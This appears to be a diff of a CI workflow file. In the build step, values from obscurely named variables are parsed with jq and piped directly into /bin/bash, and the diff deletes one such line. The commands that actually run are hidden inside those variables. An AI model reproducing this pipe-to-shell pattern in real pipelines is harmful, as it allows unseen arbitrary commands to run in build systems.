@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$gnf12" | jq -r .mykq4425 | /bin/bash
           printf '%s' "$d132" | jq -r .ljju25 | /bin/bash
-          echo $vo5132 | jq -r .hu97388 | /bin/bash
           echo $lz1902 | jq -r .hgv163 | /bin/bash
 
       - name: Upload artifact
